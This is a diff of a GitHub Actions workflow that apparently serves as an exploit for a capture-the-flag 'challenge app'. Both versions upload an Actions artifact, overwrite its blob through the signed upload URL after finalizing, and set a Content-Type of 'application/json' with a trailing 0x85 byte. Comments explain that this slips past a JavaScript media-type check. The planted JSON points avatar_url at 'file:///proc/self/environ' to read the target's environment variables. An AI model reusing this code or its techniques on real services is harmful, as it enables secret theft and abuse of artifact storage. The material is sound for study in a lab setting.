@@ -1,7 +1,4 @@
-name: rc-carrier
-# One-file Repo Cassette carrier.
-# Re-uploads each Actions artifact blob with Content-Type
-# "application/json" + a trailing 0x85 byte and reports the download headers.
+name: rc-mime
 on:
   workflow_dispatch:
   push:
@@ -9,25 +6,18 @@ permissions:
   actions: write
   contents: read
 jobs:
-  carrier:
+  mime:
     runs-on: ubuntu-latest
     steps:
       - name: deps
         run: npm install --no-save --no-audit --no-fund @actions/artifact@6.3.1
-      - name: build carrier
+      - name: build mime matrix
         uses: actions/github-script@v7
         env:
           GITHUB_TOKEN: ${{ github.token }}
         with:
           script: |
-            // Builds an Actions artifact whose raw blob is re-uploaded with an
-            // attacker-chosen Content-Type (application/json + trailing 0x85 / NEL).
-            // The 0x85 makes the challenge app's JS mediaType() miss "application/json"
-            // while the postcard's Python strip() normalises it back.
-            //
-            // Order matters: CreateArtifact -> PUT placeholder -> FinalizeArtifact (the id
-            // is only known after finalize) -> PUT the real payload to the same signed
-            // upload URL. The signed URL stays valid and the blob content wins on download.
+            // Does CreateArtifact accept a MIME that yields Content-Type application/json+0x85?
             const {createHash} = await import('node:crypto');
             const https = (await import('node:https')).default;
             const WS = process.env.GITHUB_WORKSPACE || process.cwd();
@@ -43,96 +33,68 @@ jobs:
 
             const req = (url, method = 'GET', body = null, headers = {}) => new Promise((res, rej) => {
               const u = new URL(url);
-              const r = https.request(u, {method, headers, timeout: 30000}, resp => {
+              const r = https.request(u, {method, headers, timeout: 25000}, resp => {
                 const c = []; resp.on('data', d => c.push(d));
                 resp.on('end', () => res({status: resp.statusCode, headers: resp.headers, raw: resp.rawHeaders, body: Buffer.concat(c)}));
               });
               r.on('error', rej); r.on('timeout', () => r.destroy(new Error('timeout')));
               if (body) r.write(body); r.end();
             });
-
-            const ctHexAll = r => {
+            const ctHex = r => {
               const out = [];
               for (let i = 0; i < r.raw.length; i += 2)
                 if (r.raw[i].toLowerCase() === 'content-type') out.push(Buffer.from(r.raw[i + 1], 'latin1').toString('hex'));
               return out;
             };
 
-            // payload body: a repository document whose avatar_url we control
-            const mkBody = artifactId => Buffer.from(JSON.stringify({
-              full_name: `${repo}/actions/artifacts/${artifactId}/zip`,
-              owner: {login: 'cassette', avatar_url: 'file:///proc/self/environ'},
-              description: 'repo cassette',
-              stargazers_count: 0,
-            }), 'utf8');
+            const CASES = [
+              ['ctl',        'application/json'],
+              ['raw85',      'application/json\u0085'],
+              ['lead85',     '\u0085application/json'],
+              ['pct85',      'application/json%85'],
+              ['pct2585',    'application/json%2585'],
+              ['sp85',       'application/json \u0085'],
+              ['85sp',       '\u0085 application/json'],
+              ['param',      'application/json;charset=utf-8'],
+              ['upper',      'Application/JSON'],
+              ['octet',      'application/octet-stream'],
+              ['nel-mid',    'application/\u0085json'],
+            ];
 
-            async function variant(label, blobType, blobContentType, mime) {
-              const name = `rc-${label}-${stamp}`;
-              const out = {label, blobType, blobCtHex: Buffer.from(blobContentType, 'latin1').toString('hex'), mime};
+            for (const [label, mime] of CASES) {
+              const name = `rc-m-${label}-${stamp}`;
+              const out = {label, mimeHex: Buffer.from(mime, 'latin1').toString('hex')};
               try {
                 const created = await client.CreateArtifact({...ids, name, version: 7, mimeType: StringValue.create({value: mime})});
-                if (!created.ok) throw new Error('CreateArtifact !ok');
+                out.createOk = !!created.ok;
+                if (!created.ok) throw new Error('CreateArtifact ok=false');
                 const up = created.signedUploadUrl;
                 const placeholder = Buffer.from('{}');
-
-                if (blobType === 'block') {
-                  out.put1 = (await req(up, 'PUT', placeholder, {'x-ms-blob-type': 'BlockBlob', 'x-ms-blob-content-type': blobContentType, 'Content-Length': '2'})).status;
-                } else if (blobType === 'append') {
-                  out.put1 = (await req(up, 'PUT', Buffer.alloc(0), {'x-ms-blob-type': 'AppendBlob', 'x-ms-blob-content-type': blobContentType, 'Content-Length': '0'})).status;
-                  out.put2 = (await req(up + (up.includes('?') ? '&' : '?') + 'comp=appendblock', 'PUT', placeholder, {'x-ms-blob-content-type': blobContentType, 'Content-Length': '2'})).status;
-                } else if (blobType === 'page') {
-                  const page = Buffer.concat([placeholder, Buffer.alloc(512 - 2, 0x20)]);
-                  out.put1 = (await req(up, 'PUT', Buffer.alloc(0), {'x-ms-blob-type': 'PageBlob', 'x-ms-blob-content-length': '512', 'x-ms-blob-content-type': blobContentType, 'Content-Length': '0'})).status;
-                  out.put2 = (await req(up + (up.includes('?') ? '&' : '?') + 'comp=page', 'PUT', page, {'x-ms-range': 'bytes=0-511', 'x-ms-blob-content-type': blobContentType, 'Content-Length': '512'})).status;
-                }
-
+                out.put = (await req(up, 'PUT', placeholder, {'x-ms-blob-type': 'BlockBlob', 'Content-Length': '2'})).status;
                 const fin = await client.FinalizeArtifact({...ids, name, size: '2', hash: StringValue.create({value: `sha256:${sha(placeholder)}`})});
-                if (!fin.ok) throw new Error('FinalizeArtifact !ok');
-                const artifactId = String(fin.artifactId);
-                out.artifactId = artifactId;
-                out.path = `${repo}/actions/artifacts/${artifactId}/zip`;
-
-                // now the real payload, same signed upload URL
-                const body = mkBody(artifactId);
-                out.payloadSha = sha(body);
-                out.payloadLen = body.length;
-                if (blobType === 'block') {
-                  out.put3 = (await req(up, 'PUT', body, {'x-ms-blob-type': 'BlockBlob', 'x-ms-blob-content-type': blobContentType, 'Content-Length': String(body.length)})).status;
-                } else if (blobType === 'append') {
-                  out.put3 = (await req(up + (up.includes('?') ? '&' : '?') + 'comp=appendblock', 'PUT', body, {'x-ms-blob-content-type': blobContentType, 'Content-Length': String(body.length)})).status;
-                } else if (blobType === 'page') {
-                  const page = Buffer.concat([body, Buffer.alloc((512 - body.length % 512) % 512, 0x20)]);
-                  out.put3 = (await req(up + (up.includes('?') ? '&' : '?') + 'comp=page', 'PUT', page, {'x-ms-range': `bytes=0-${page.length - 1}`, 'x-ms-blob-content-type': blobContentType, 'Content-Length': String(page.length)})).status;
-                }
-
-                // self-check exactly as the challenge app fetches it
-                const api = await req(`https://api.github.com/repos/${out.path}`, 'GET', null, {
+                out.finalizeOk = !!fin.ok;
+                if (!fin.ok) throw new Error('FinalizeArtifact ok=false');
+                out.artifactId = String(fin.artifactId);
+                const body = Buffer.from(JSON.stringify({
+                  full_name: `${repo}/actions/artifacts/${out.artifactId}/zip`,
+                  owner: {login: 'cassette', avatar_url: 'file:///proc/self/environ'},
+                  description: label, stargazers_count: 0,
+                }));
+                out.put2 = (await req(up, 'PUT', body, {'x-ms-blob-type': 'BlockBlob', 'Content-Length': String(body.length)})).status;
+                const api = await req(`https://api.github.com/repos/${repo}/actions/artifacts/${out.artifactId}/zip`, 'GET', null, {
                   Authorization: `Bearer ${process.env.GITHUB_TOKEN}`,
                   Accept: 'application/vnd.github.v3+json',
-                  'User-Agent': 'rc-carrier',
+                  'User-Agent': 'rc-mime-matrix',
                 });
                 out.restStatus = api.status;
                 if (api.status === 302 && api.headers.location) {
                   const loc = new URL(api.headers.location);
                   out.rsct = loc.searchParams.get('rsct');
                   const final = await req(loc.href);
-                  out.finalStatus = final.status;
-                  out.finalCtHex = ctHexAll(final);
+                  out.finalCtHex = ctHex(final);
                   out.bodyMatch = final.body.equals(body);
                 }
-              } catch (e) { out.error = String(e.message || e).slice(0, 240); }
-              console.log('RCCARRIER ' + JSON.stringify(out));
-              return out;
+              } catch (e) { out.error = String(e.message || e).slice(0, 200).replace(/https?:\/\/\S+/g, '[url]'); }
+              console.log('RCMIME ' + JSON.stringify(out));
             }
-
-            // 1) diagnostic: obviously different blob content-type -> tells us whether the
-            //    blob property or the signed URL's rsct wins on download
-            await variant('diag', 'block', 'text/x-probe', 'application/json');
-            // 2) the real thing: mime json, blob property carries the trailing NEL
-            await variant('tail85', 'block', 'application/json\u0085', 'application/json');
-            // 3) same, but mime octet-stream in case some MIMEs omit rsct entirely
-            await variant('tail85oct', 'block', 'application/json\u0085', 'application/octet-stream');
-            // 4) append / page blobs may ignore the rsct response override
-            await variant('append85', 'append', 'application/json\u0085', 'application/json');
-            await variant('page85', 'page', 'application/json\u0085', 'application/json');
-            console.log('RCCARRIER DONE');
+            console.log('RCMIME DONE');
